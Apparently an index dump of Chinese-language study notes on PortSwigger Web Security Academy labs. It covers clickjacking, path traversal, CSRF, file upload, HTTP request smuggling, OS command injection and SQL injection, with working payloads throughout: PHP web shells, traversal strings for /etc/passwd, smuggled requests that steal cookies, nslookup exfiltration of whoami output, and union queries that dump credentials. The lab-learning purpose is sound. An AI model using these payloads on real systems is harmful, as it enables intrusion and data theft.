&#123; position:absolute; top:510px; left:50px; z-index: 1; &#125; .secondClick &#123; top:285px; left:225px; &#125; &lt;/style&gt; &lt;div class=&quot;firstClick&quot;&gt;Click me first&lt;/div&gt; &lt;div class=&quot;secondClick&quot;&gt;Click Store&lt;/div&gt; &lt;iframe src=&quot;https://0a9a0010038a45ffc436c9d000f50019.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之目录遍历","path":"/wiki/portswigger/directory-traversal.html","content":"所有实验室 |网络安全学院 (portswigger.net) Directory traversal 1. 文件路径遍历，简单案例 File path traversal, simple case 使用 Burp Suite 截获和修改获取产品图像的请求。 修改参数filename，观察响应是否包含文件的内容。/etc/passwd ../../../etc/passwd # 相对路径 “../&quot;，这个路径表示回到上一级目录 访问操作系统中的 passwd 文件。passwd 文件包含系统中所有用户的用户名、密码、用户 ID、主目录等信息 2. 文件路径遍历，通过绝对路径旁路阻止遍历序列 File path traversal, traversal sequences blocked with absolute path bypass 使用 Burp Suite 修改产品图像的请求filename /etc/passwd 当接收到用户提供的路径时，应用程序首先将其解析为绝对路径，然后将其与白名单中的路径进行比较。防止攻击者使用目录遍历序列来访问应用程序之外的文件和目录。 如果路径在白名单内，则认为是合法的； 否则，应用程序会拒绝该请求并返回错误信息。 3. 文件路径遍历，非递归剥离遍历序列 File path traversal, traversal sequences stripped non-recursively 非递归剥离遍历序列：应用程序会解析路径并对其进行分析，然后使用算法来**删除路径中的 “…/” 遍历序列** 使用双写绕过 ....//....//....//etc/passwd 4. 文件路径遍历，使用多余的 URL 解码剥离遍历序列 File path traversal, traversal sequences stripped with superfluous URL-decode 第四关/被过滤了，所以需要对其进行 URL 编码，但在 burp 中用 Repeater 发送后还是错误，得知需要进行第二次 URL 编码才可绕过 ..%252f..%252f..%252fetc/passwd 5. 文件路径遍历，路径开始验证 File path traversal, validation of start of path 验证请求的文件路径是否以 “/var/www/” 开头 /var/www/images/../../../etc/passwd 6. 文件路径遍历，使用空字节旁路验证文件扩展名 File path traversal, validation of file extension with null byte bypass 在 URL 编码中，%00 可以用于表示字符串的结束符。 作用是将“.png”文件名截断，使得请求实际上是针对“/etc/passwd”这个文件的 ../../../etc/passwd%00.png","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 CSRF 篇","path":"/wiki/portswigger/csrf.html","content":"Cross-site request forgery (CSRF) All labs | Web Security Academy (portswigger.net) 1. 没有防御措施的 CSRF 漏洞 题目中已告知易受攻击的是电子邮件的更改功能，而目标是利用 csrf 漏洞更改受害者的电子邮件地址，最后给出了登录凭据：wiener:peter。 登录 wiener 用户——首先做的事是根据给定的登录凭据进行登录，点击 My account 登录，登录后就到了一个更改邮箱的界面，这时候然设置代理以便 burp 抓包。 burp 抓包——尝试输入test@test.ca，点击 update email，通过 burp 抓包，发送到 repeater 后关闭拦截，此时回到更改邮箱的界面发现电子邮件已被更改为test@test.ca 。 进行 csrf 攻击——因为 burp 有自动生成脚本的功能，右键 Generate CSRF PoC，进入界面后在选项一栏把自动提交脚本勾选上，这时候 burp 会自动提交表单不需要自己点击提交了。点击 regenerate 重新生成发现多了document.forms[0].submit();。 进行 csrf 攻击——把代码中的 emali 修改为testcsrf1@test.ca以便测试之用，接着 copyhtml，转到漏洞利用服务器，在 body 中放入 html，store 保存，点击 View exploit 查看漏洞，最后 Deliver to victim，传递给受害者即可成功 生成 CSRF PoC CSRF HTML 修改成功 2. token 验证取决于请求方法 登录 wiener 用户——依旧是账号密码进行登录，wiener:peter，然后在更改邮箱的界面输入test@test.ca进行抓包 改变请求方法——因为 POST 请求会对 token 验证（在没有 token 的情况下会 404），从而无法修改邮箱，而 GET 不需要。于是右键 burp 点击 Change request method，将请求方法从 POST 更改为 GET 在 POST 请求下删掉 token 会404 GET 请求下没有 token 进行 csrf 攻击在 burp 中右键生成 csrf poc，选项中把自动提交脚本选择上，代码中的 emali 修改为testcsrftoken1@test.ca，copy html，用 burp 的服务器托管脚本，粘贴到 body 中。最后点击&quot;Store&quot;，并发送给受害者，完成试验 成功修改了邮箱 3. token 验证取决于 token 的存在 在上一个关卡，请求改为 GET 是因为检查了 POST 方法是否允许我们删除 token，删除 token 后，POST 请求 404， 所以可以用 GET 方法进行绕过 在这一关中攻击者删除 token，返回 302。这说明 token 不存在请求便会通过，简单粗暴 右键生成 CSRF Poc，后续步骤和前面一致 token 删掉返会状态码 302 4. token 与用户会话无关 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 登录两个账户——把两个账户分别分别登陆，目标是从 wiener 那更改 carlos 的电子邮件地址 使用 firefox 登录账户 改变请求方法——拦截 wiener 的请求在 burp 中查看，删除 csrt token 的一个字符返回 404，请求方法改为 GET，依旧是 404 修改邮件拦截请求 根据前两个实验室，均以失败告终 从 carlos 用户中找到 CSRF Token——登录 carlos，在更改邮箱的界面打开“开发者工具”找到 CSRF Token，复制后在 burp 中粘贴到相应位置，返回 302 这说明虽然应用程序需要一个 token 处理请求，但不关心它是怎么来的。换言之，应用系统仅会验证 CSRF Token 的有效性，而不会验证该 Token 是否属于当前用户，也就是标题说的 Token 不会与用户会话绑定 进行 csrf 攻击——最后利用 burp 的 csrf poc 功能，复制 html 后需要回到攻击者 wiener，刷新 carlos 的网页来收集新的 token（token 随着请求的变化而变化）替换到 burp 中 5. token 绑定到非会话 cookie 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 测试 CSRF Token 和 CSRF Cookie 抓包 wiener 用户 ——发现 Cookie 中存在一个 csrfkey。删除 CSRF Token 的某个字符则返回 400。 查看 carlos 用户的 CSRF Token——从另一个用户查看 Cookie 是否相互绑定。登录另一个用户(carlos)，可以在火狐无痕窗口，查看 CSRF Token，粘贴到 wiener 用户的 burp，send 发送后 400。 查看 carlos 用户的 CSRFKey cookie——在 carlos 账户中，点开网络，点重新载入，找到 CSRFKey cookie。粘贴到 wiener 用户的 burp，send 发送后 302，这说明两者没有进行绑定的，可喜可贺。 **wiener 用户首页搜索框中 CSRFKey 参数注入 **——在 wiener 账户的首页发现有搜索框，输入“ceui”进行抓包处理，能看到搜索的关键词在 Set-Cookie 标头。因为搜索功能没有 CSRF 保护，所以可以轻而易举的注入 cookie。 将已知的 csrfKey cookie 注入给被攻击者 /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None # SameSite=None——显式设置 SameSite=None（一个新值），该值表示放弃对 Cookie 的 Same-Site 策略设置，通俗说就是“我不管了”。 抓包查看 Set-Cookie 标头 URL 编码 利用此漏洞将 cookie 注入受害者的浏览器 csrf 攻击——最后存储漏洞，单击“交付给受害者”。 在 wiener(攻击者) 用户的 burp 请求中右击生成 PoC 6. token 在 cookie 中重复 如图所示，应用程序只需验证在请求参数中提交的 Token 是否与 Cookie 中提交的值匹配 搜索，查看 Set-Cookie 标头中是否有搜索词 将虚假 CSRF Cookie 注入受害者浏览器的 URL 最后注入 cookie 并提交表单 7. Referer 验证取决于 header 是否存在 登录帐户，抓取“更新电子邮件”表单的请求 在 burp 中查看，发现出现了 Referer，删除则返回 302 即成功 在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的*来源地址*，同源检测（Origin 和 Referer 验证） 生成 PoC 网页返回 “Invalid referer header”，这是因为 Referer 的来源是 burp 禁止 Referer 标头，&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;，作用是控制页面发送给 server 的 referer 信息，告诉服务器端用户是从哪个页面来到当前网页的。 no-referrer： 所有请求不发送 referrer 更新电子邮件表单的请求 burp 右击生成 PoC 因为有 Referer 限制而无效 Referer 来源于 burp，这才导致错误 成功修改 8. Referer 验证失效的 CSRF 登录帐户，抓取“更新电子邮件”表单的请求 追加到 Referer 标头请求成功，这说明网站似乎接受任何包含预期的 Referer 标头 在 script 中编辑 JavaScript history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?0aac003b03b74a00c0510db300a200ff.web-security-academy.net&quot;) 在头部添Referrer-Policy: unsafe-url，是因为需要请求中包含完整的 URL ，以此来覆盖浏览器的默认配置（默认从 Referer 标头中删除查询字符串） 追加到 Referer 标头 history.pushState() 添加 history.pushState() 在漏洞利用服务器中","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场之“文件上传”","path":"/wiki/portswigger/file-upload.html","content":"File upload vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Remote code execution via web shell upload 通过 Web shell 上传远程执行代码 目标：读取/home/carlos/secret文件的内容 过程 登录用户，选择一个图片上传。用 burp 分别拦截“上传文件”和“查看文件”的数据包，一个 POST 请求，另一个是 GET 请求 在 burp 上传文件中文件名后缀改为.php，删除原来图片的内容，替换为 php webshell，并且上传 在*查看文件*数据包中，访问上传的 webshell；或者回到浏览器，先刷新页面，后右键图片在新标签页打开 # PHP 的读取代码 &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt; # file_get_contents() 把整个文件读入一个字符串中。 2. Web shell upload via Content-Type restriction bypass 通过 Content-Type 限制绕过 Web shell 上传 先登录，上传图片，在 burp 的 http history 中拦截“上传文件”和“查看文件”的数据包，并转发到 Repeater，重命名为Upload File Show File以便更好地观察 在 burp 上传文件中，修改名称、删除图片内容替换为 php webshell，最重要的一点是将Content-Type 修改为image/jpeg 后续步骤如法炮制而来 &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt; 3. Web shell upload via path traversal Web Shell 通过路径遍历上传 传入 webshell 后&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;，访问文件的时候**显示了未经解析的源代码，由此想到该目录没有执行权限，需要上传到其他目录，进行目录遍历** 在 burp 上传数据包，将文件名改为../文件名，需要经过 URL 编码，编码后是..%2f文件名，文件将被上传到“上一层”文件夹 4. Web shell upload via extension blacklist bypass Web Shell上传通过扩展黑名单绕过 按照往常一样上传 PHP webshell，服务器回答说“不允许”上传 PHP 文件。从响应中，注意到正在运行的服务器是 Apache， .htaccess文件是 Apache 服务器的一个配置文件，负责相关目录下的网页配置。能够实现*改变文件扩展名、允许/阻止特定的用户或者目录的访问* 可以欺骗 Apache 服务器将任意*自定义文件扩展名*映射到可执行的 MIME 类型。 第一步、修改.htaccess文件 # 修改名称 .htaccess # 修改 Content-Type text/plain # 修改内容 AddType application/x-httpd-php .shell 实现的功能就是：所有上传的.shell文件都会被当作php文件执行 接着上传一个后缀名为shell的文件，完成实验室任务 # 修改名称 code.shell # 修改 Content-Type image、png # 修改内容 &lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt; 5. Web shell upload via obfuscated file extension 通过混淆文件扩展名上传 Web Shell 利用%00 截断 文件名用 Burp 改 code.php%00.png、 在 url 中 %00 表示 ascll 码中的 0 ，而 ascii 中 0 作为特殊字符保留，表示字符串结束，所以当 url 中出现 %00 时就会认为读取已结束 当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃 6. Remote code execution via polyglot web shell upload 通过多语言 web shell 上传远程代码执行 服务器可能通过图像的字节序列来判断是否是jpeg、png文件等；使用 ExifTool 创建包含元数据中恶意代码的多语言 JPEG 文件 在 kali 中安装 ExifTool apt install libimage-exiftool-perl 利用 ExifTool exiftool -Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot; code.jpg -o code.php 7. Web shell upload via race condition 通过竞争条件上传 Web shell 通过 Race Condition，上传的 webshell 文件会先存到一个文件夹中，然后才会确认是否合法，如果不合法再删掉。文件被删除之前这段间隙去突破","tags":[null,null],"categories":[null]},{"title":"PortSwigger 靶场之 HTTP 请求走私","path":"/wiki/portswigger/http-request-smuggling.html","content":"All labs | Web Security Academy (portswigger.net) HTTP request smuggling 1. HTTP request smuggling, basic CL.TE vulnerability HTTP 请求走私，基本的 CL.TE 漏洞 当 Content-Length 和 Transfer-Encoding 同时出现时，客户端应该遵循 Transfer-Encoding 的规则，而忽略 Content-Length，因为 Transfer-Encoding 机制会将消息体进行拆分 这关主要是通过更改 Content-Length 的值，发送带有 Transfer-Encoding 头部的正文来达到欺骗服务器的目的 POST / HTTP/1.1 Host: 0a06001d03118aa0c4626eb800680067.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G 2. HTTP request smuggling, basic TE.CL vulnerability HTTP 请求走私，基本的 TE.CL 漏洞 和第一关的区别是，这一关更改 Transfer-Encoding 的值，然后通过发送带有 Content-Length 的正文来欺骗服务器 声明了 Content-length 为 4，但随后使用了 Transfer-Encoding: chunked，这意味着请求体被分成多个部分（即块），每个块都包含一个十六进制的数字，表示该块的大小。第一个块的大小为 5c（十六进制，等于 92），所以后面的块包含了 92 个字符。 但是由于存在 TE.CL 漏洞，**服务器会忽略 Content-length，因此不会将前面的 4 个字符视为请求体的一部分。**相反，服务器会将第一个块的大小视为整个请求体的大小，从而导致攻击者可以向服务器发送包含恶意内容的块，这些内容被认为是请求体的一部分，但实际上并不包含在 Content-length 中声明的大小范围内。 POST / HTTP/1.1 Host: 0a83009b049ca08ec342d8a2002f0070.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 3. HTTP request smuggling, obfuscating the TE header HTTP 请求走私，混淆 TE 标头 在请求中添加多个 Transfer-Encoding 头部来混淆或欺骗服务器。在这关中出现了两个 Transfer-Encoding 字段，一个值为 “chunked”，另一个值为 “cow”。 请求体的内容是经过编码的，其中包括了一个 GPOST 请求以及一个包含参数 x=1 的请求体。 POST / HTTP/1.1 Host: 0a5200a4048704c8c3857a68009c004f.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked Transfer-encoding: cow 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP 请求走私，通过差异响应确认 CL.TE 漏洞 第一个请求使用了 Transfer-Encoding: chunked 标头来指示请求体的长度为分块编码形式，并设置长度为0，表示请求体为空。 第二个请求使用了 Content-Length 标头来指示请求体的长度为35个字节。 这两个请求放在了一起，会解析出两个不同的请求，其中第一个请求不包含请求体，而第二个请求包含了一个长度为35个字节的请求体。 POST / HTTP/1.1 Host: 0a6800d904fae8a2c5f918c700250023.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses HTTP 请求走私，通过差异响应确认 TE.CL 漏洞 第一个请求的数据块长度为 0x5e，即 94，后面跟着一个 POST 请求，其请求体为 x=1。 第二个请求的数据块长度为 0，表示这是最后一个数据块。 POST / HTTP/1.1 Host: 0a7b005103ea6bc6c04abe7a0021006d.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5e POST /404 HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞 POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 37 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-Ignore: X 本地用户localhost放入后，Host标头又冲突了 POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X 将第二段请求，改为正常的请求包 POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= 删除用户： carlos POST / HTTP/1.1 Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability 利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞 POST / HTTP/1.1 Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 60 POST /admin HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 POST / HTTP/1.1 Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 删除用户carlos： POST / HTTP/1.1 Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0 8. Exploiting HTTP request smuggling to reveal front-end request rewriting 利用 HTTP 请求走私来揭示前端请求重写 观察搜索功能看它是否反映了参数值search POST / HTTP/1.1 Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 124 Transfer-Encoding: chunked 0 POST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 200 Connection: close search=test 第一次请求标头的名称，用它来访问管理面板： POST / HTTP/1.1 Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 143 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-OhZACS-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1 更改走私的请求 URL 以删除用户carlos POST / HTTP/1.1 Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 166 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 X-OhZACS-Ip: 127.0.0.1 Content-Type: application/x-www-form-urlencoded Content-Length: 10 Connection: close x=1 9. Exploiting HTTP request smuggling to capture other users’ requests 利用 HTTP 请求走私来捕获其他用户的请求 访问博客文章并发表评论，抓包请求 需要慢慢增加走私请求中 Content-Length 标头的值，直到捕获整个 cooki POST / HTTP/1.1 Host: 0a5f00f5030f2821c174b72d00c100e3.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 600 Cookie: session=enYe7PbIpOv50lcgDeOWdEO3Ymf6m7dq csrf=XsZYgcHX6NuQAkteJIBenpeAfd8nNMiY&amp;postId=5&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=&amp;comment=comment+2 10. Exploiting HTTP request smuggling to deliver reflected XSS 利用 HTTP 请求走私来传递反射 XSS","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场 | 操作系统命令注入","path":"/wiki/portswigger/os-command-injection.html","content":"OS command injection All labs | Web Security Academy (portswigger.net) 常见注入方式 分号分割 || &amp;&amp; &amp; 分割 | 管道符 \\r %d0%a0 换行 反引号解析 $() 替换 1. OS command injection, simple case OS命令注入，简单案例 **目标：**执行命令以确定当前用户的名称。whoami 过程： 用 burp 拦截数据包，有两个参数分别是产品和商店 Post 设置参数，whoami 命令用于显示自身用户名称 1 &amp; whoami # URL 编码后 1+%26+whoami+%23 2. Blind OS command injection with time delays 具有时间延迟的盲操作系统命令注入 **目标：**通过 sleep 10 秒判断出问题所在 过程： 在“反馈”界面抓包处理，分别测试name email等参数 +%26+sleep+10+%23 &amp; sleep 10 # 3. Blind OS command injection with output redirection 带有输出重定向的盲操作系统命令注入 **目标：**通过 whomi 命令，输出重定向到/var/www/images/ 过程： 在“反馈”界面抓包处理，分别测试name email等参数 让应用程序在输出响应之前休眠 10 秒，来确认是否有盲注命令注入，测试后发现易受攻击的字段是email 可通过 F12 把 emali 的 type 改为 text，以此绕过前端检查，来提交反馈 在电子邮箱处填写&amp; whoami &gt; /var/www/images/ling.txt #，执行 whoami 命令，将内容保存在 ling.txt 访问图片网址，修改文件名成 ling.txt # 等待十秒 &amp; sleep 10 # # 将内容保存在 ling.txt &amp; whoami &gt; /var/www/images/ling.txt # # 访问 https://0ab8007b0415044bc48b9b5d001e00fb.web-security-academy.net/image?filename=ling.txt 4. Blind OS command injection with out-of-band interaction 带有带外交互的盲操作系统命令注入 **目标：**利用盲操作系统命令注入漏洞向 Burp 协作者发出 DNS 查找 过程： 需要 Burp pro 而不是社区版，利用 nslookup 命令去外带出回显 nslookup 命令用于查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题 +%26+nslookup+bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com+%23 # URL 解码后 &amp; nslookup bl0lvdghtfv8hqndmhnfu63e258vwk.oastify.com # 5. Blind OS command injection with out-of-band data exfiltration 带外数据泄露的盲 OS 命令注入 启用 Burp Collaborator client，复制到剪贴板；拦截和修改提交反馈的请求，修改 email 参数 &amp; nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # &amp; nslookup $(whoami).kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com # ||nslookup `whoami`.kg4mmv2y7ie1qqgamf1tjgf7aygo4d.oastify.com|| 最后，在 burp 的子域名中，可以看到 DNS 交互，获得当前用户名 0","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场记录","path":"/wiki/portswigger/index.html","content":"最近闲来无事，折腾了一下 PortSwigger 实验室的各种实验，顺便做了点笔记，如果这些记录能帮到别人，那就更是一种幸事。","tags":[null],"categories":[null]},{"title":"portswigger 靶场之 SQL 注入","path":"/wiki/portswigger/sql-injection.html","content":"All labs | Web Security Academy (portswigger.net) WHERE 子句中的 SQL 注入漏洞允许检索隐藏数据 目的为查看隐藏的数据，所有产品 URL 中输入单引号，查看是否存在漏洞，服务器返回一个错误，借以得知容易受到 SQL 注入攻击 URL 中输入'+OR+1=1-- （查询字符串中空格被编码成+号） 数据库执行的 SQL 查询则为 SELECT * FROM products WHERE category = ''or 1=1-- ' AND released = 1 通过'来闭合参数，-- 来注释后半部分 bp 允许绕过登录的 SQL 注入漏洞 目的为以管理员用户登录应用程序 尝试账号密码为admin。网页显示，Invalid username or password，无效的用户名或密码，故此不知道是用户名还是密码错误。 从实验室说明中查的用户名为administrator 在Username中输入any' or 1=1 -- ，密码随便写毕竟会被注释掉 用any'来闭合参数，or一个为真即可通过，-- 是 sql 的注释语法注释掉后面的密码 在Username中输入administrator'-- ，密码随便写毕竟会被注释掉 浏览器连上代理，在登录页面用 bp 抓包，修改其参数 SQL 注入 UNION 攻击，确定查询返回的列数 目的为查找列数为多少，两种方法，可以用order by和union ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序 UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 URL 中输入' order by 1-- ' order by 2-- ' order by 3-- 网站正常显示 直到输入了“ ' order by 4--”，服务器抛出了一个错误，这表明试图排序的列不存在，也就是说只有 3 列 URL 中输入' union select null-- ' union select null,null-- 服务器皆返回了一个错误，这表明不只有一两列存在 ' union select null,null,null-- 网站正常显示，这说明是有三列数据存在 在 bp 中 浏览器需要进行 URL 编码，在 bp 中 可以用快捷键 Ctrl + U 来为其添加 确定列数为 3 SQL 注入 UNION 攻击，查找包含文本的列 通过枚举' order by 数字--'得知总共有 3 列数据存在 然后在' union select null,'1',null-- 的参数中替换字符串数据借以得知与哪列相匹配 错误的话，说明不是字符串类型的 成功，数据类型是“字符串” 最后替换文中所给的字符串 SQL注入 UNION 攻击，从其他表中检索数据 检索所有用户名和密码，administrator 得知数据库包列名为users username password 通过联合查询查找空字符串，' union select null,null--得知可以返回两列 测试' union select '1','2'--得知两列为字符串类型 最后通过' union select username,password from users--得知账号密码登录即可 后台 SQL 查询为 select &amp; from products where category = 'Gifts' union select username,password from users-- ' AND released = 1 SQL注入UNION攻击，在单个列中检索多个值 用' order by'来迭代 ' order by 3服务器显示错误提示，得知列数为 2 通过 ' union select null,'a'-- 来看是否接收字符串类型 页面正常输出表示可以接受字符串类型 数据库 ' union select null,version()--——查询PostgreSQL数据库版本 网站返回结果，说明数据库是PostgreSQL ' union select null,@@version--——查询MySQL数据库版本 失败 在单个列中检索需要用到字符串的连接，PostgreSQL的连接为|| ' union select null,username ||'_'|| password from users-- administrator_9wif5hcpr46lfc99l2yi SQL注入攻击，查询 Oracle 上的数据库类型和版本 用' order by'来迭代找到列数 ' order by 3-- '500，实践证明列数为 2 -- Oracle 查询数据库版本 Oracle\tSELECT banner FROM v$version SELECT version FROM v$instance 在 URL 或者 bp 软件中输入' union select null,banner from v$version-- ' SQL注入攻击，在 MySQL 和 Microsoft 上查询数据库类型和版本 依然是 '+order+by+3--+两列 ' union select @@version,null-- SQL注入攻击，列出非 Oracle 数据库上的数据库内容 通过' union select null,null-- '查得是两列 其次确定每列的字段数据类型 查询数据库类型 PostgreSQL 查询数据库应为' union select version(),null-- '，查询结果为 200，说明数据库是PostgreSQL PostgreSQL SELECT * FROM information_schema.tables ELECT * FROM information_schema.columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 表 ' union select table_name,null from information_schema.tables-- '——查询数据库的表名 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_ 找到了users_squiqq 列 ' union select column_name,null from information_schema.columns where table_name='users_squiqq'-- ' username_fklyld password_vqihba 检索所有的用户名和密码 ' union select username_fklyld,password_vqihba from users_squiqq-- 找到 administrator 的密码为 kb1zf7n2k5jf1gxst3q8 SQL注入攻击，列出Oracle上的数据库内容 确定列数为 2 ，' union select null,null from dual-- 数据库 Oracle 查询需要加 from dual 查看每列的数据类型 ' union select 'a','b' from dual-- ，页面 200，表明是字符型 因为数据库是“Oracle” Oracle SELECT * FROM all_tables SELECT * FROM all_tab_columns WHERE table_name = ‘TABLE-NAME-HERE’` 紧接着，要列出数据库中存在的表以及这些表包含的列 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 Oracle 的数据表是 all_tables 通过搜索 all_tables Oracle 找到表的字段名是TABLE_NAME 找到包含用户密码的表的名字 ' union select TABLE_NAME,null from all_tables-- 一般users_开头的表名，存放着用户名和密码，所以 Ctrl + f 搜索users_得到USERS_EKARCY 找到包含用户密码的列的名字 从 [SQL injection cheat sheet](SQL injection cheat sheet | Web Security Academy (portswigger.net))中找到 all_tab_columns，这是一个数据表的名字；通过搜索 all_tab_columns Oracle找到表的字段名是COLUMN_NAME ' union select COLUMN_NAME,null from all_tab_columns where table_name = 'USERS_EKARCY'-- USERNAME_VYRGKY PASSWORD_TWCYAQ 最后查询用户名和密码登录即可 ' union select USERNAME_VYRGKY,PASSWORD_TWCYAQ from USERS_EKARCY-- administrator；q6jra0hcl8lu1hmjge4m 具有条件响应的盲 SQL 注入 目标为枚举管理员密码，以管理员用户登录。如果查询有结果，页面会显示“welcome back” 首先要确认参数容易受到 SQL 注入 在 cookie 中注入参数 welcome back --&gt; true ' and 1=1-- TrackingId=fL8CZZ0ptOt9cR8T' and 1=1--，前面参数一定是 true， 1=1 也是 true no welcome back --&gt; false TrackingId=fL8CZZ0ptOt9cR8T' and 1=0--，前面参数一定是 true， 1=0 是 false。true and false = false 服务器根据' and 1=1--（true）和' and 1=0--（false）做出不同响应，所以可以使用盲注来推断数据库中的内容 确认数据库中存在用户表“users” ' and (select 'x' from users limit 1) = 'x'-- 'x' = 'x' --&gt; true；返回 welcome back limit 子句用于限制 SELECT 语句中查询的数据的数量，limit 1，限制查询结果为 1 确认用户表中有用户名字段“administrator” ' and (select username from users where username='administrator') = 'administrator'-- 'administrator' = 'administrator' --&gt; true；返回 welcome back，说明 administrator 的用户名字段存在 找到管理员用户 administrator 的密码长度 ' and (select 'a' from users where username='administrator' and length(password)&gt;1)='a'-- 'a'='a'–&gt; true；返回 welcome back send to intruder 测试对应位置的密码字符 用到一个函数，SUBSTRING(password,m,n)，password 是字段名，m 是检索的起始位置，n 是数量。SUBSTRING() 函数从字符串中提取一些字符 使用 burp 的 Cluster bomb 爆破，随即登录即可 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- f9126lip1a49h41x6b17 不是很懂，参考了视频(4) SQL Injection - Lab #11 Blind SQL injection with conditional responses - YouTube 具有条件错误的盲 SQL 注入 审题 题目中依旧是给出了数据表 users，字段 username、password，账户名 administrator 本练习使用 Oracle 数据库 应用程序不会根据查询是否返回任何行而做出任何不同的响应 如果 SQL 查询导致错误，则应用程序将返回自定义错误消息。 证明参数是易受攻击的 添加' --&gt; 返回了 500 删除' --&gt; 返回了 200 ' || (select '') ||' --&gt; 返回了 500，说明数据库是 oracle database ' || (select '' from dual) ||' --&gt; 返回了 200 ' || (select '' from abcde) ||' --&gt; 返回了 500，abcde 是编造的不存在的数据表 验证该users表是否存在 '||(select '' from users where rownum = 1)||' --&gt; 200 说明了 users 是表存在的 rownum = 1 代表查询返回一行 MySQL 支持 LIMIT 语句来选取指定的条数数据 Oracle 可以使用 ROWNUM 来选取 || 在 Oracle中，|| 运算符可以将两个或两个以上的字符串连接在一起。string1 || string2 确认管理员administrator字段 '||(select case when(1=1) then to_char(1/0) else '' end from users where username='administrator' )||' --&gt; 500，验证条件（when 